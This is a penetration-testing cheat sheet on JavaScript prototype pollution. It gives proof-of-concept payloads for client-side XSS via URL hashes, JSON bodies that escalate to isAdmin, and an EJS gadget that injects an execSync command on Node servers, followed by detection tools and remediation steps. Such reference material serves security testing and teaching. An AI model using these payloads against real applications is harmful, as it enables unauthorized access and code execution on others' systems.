# Prototype Pollution

JS-only. Pollute `Object.prototype` so downstream reads of missing properties return attacker values.

## Sinks on client

- Any code that reads `options.foo ?? default` and uses `foo` as HTML/script source.
- jQuery `$.extend(true, ...)`, lodash `_.merge`, `_.set`, `_.defaultsDeep` (pre-fix).
- Template engines reading config from object (Handlebars, Pug).
- Router config, analytics libs reading dynamic attributes.

## Client PoC — basic

```
https://target.com/#__proto__[foo]=bar
# Then check window
console.log({}.foo)   // "bar"
```

URL-hash parsing pattern:

```js
// Vulnerable
const params = {};
location.hash.slice(1).split('&').forEach(p => {
  const [k,v] = p.split('=');
  let o = params;
  k.split('.').forEach((seg,i,arr) => {
    if (i === arr.length-1) o[seg] = v;
    else { o[seg] = o[seg] || {}; o = o[seg]; }
  });
});
// Hash: __proto__.innerHTML=<img src=x onerror=alert(1)>
```

## Gadget chains → XSS

Look for libraries used on the page. Common gadgets:

- jQuery `$.get(url, {...})` reading `ajax.setup` defaults
- Chart.js / Highcharts config merge
- Analytics libs that concatenate config into script tag `src`

Polyglot PoC:

```
#__proto__[src]=data:,alert(1)//
#__proto__[html]=<img%20src=x%20onerror=alert(1)>
#constructor[prototype][html]=...
```

Use [PPScan](https://github.com/msrkp/PPScan) Burp extension for automation.

## Server-side (Node.js)

Sinks:

- `_.merge(target, untrustedJson)` deep merges attacker-controlled keys.
- `Object.assign` is safe (shallow, direct).
- `JSON.parse` alone is safe; danger is what you do with the parsed object.

```js
// Vulnerable
app.post('/api/user', (req, res) => {
  const user = {};
  _.merge(user, req.body);       // attacker sends {"__proto__":{"isAdmin":true}}
  // later
  if (user.isAdmin) { ... }      // true even though user didn't set it
});
```

PoC body:

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

## Node → RCE gadgets

Pollute properties read by `child_process.spawn`, template engines, or `require` internals.

- Handlebars: pollute `prototype.pendingContent` variants.
- EJS: pollute `prototype.outputFunctionName` with `;process.mainModule.require('child_process').execSync('id');//`.
- Via command-line args: `prototype.shell`, `prototype.env`.

## Detection

```bash
ppmap -l urls.txt               # client-side scan
ppscan                          # Burp ext
# Manual: append ?__proto__[test]=test and watch for {}.test
```

## Remediation

- `Object.create(null)` for config objects — no prototype.
- Freeze: `Object.freeze(Object.prototype)`.
- Use `Map` for dynamic key lookups.
- Update lodash ≥ 4.17.21, jQuery ≥ 3.6, `minimist` ≥ 1.2.6, `set-value` ≥ 4.0.1.
- Input allowlist; reject keys containing `__proto__`, `constructor`, `prototype`.

## References

- PortSwigger — https://portswigger.net/web-security/prototype-pollution
- BlackFan — https://github.com/BlackFan/client-side-prototype-pollution
- HoLyVieR NorthSec 2018 research — https://github.com/HoLyVieR/prototype-pollution-nsec18
- Snyk server-side PP research — https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/
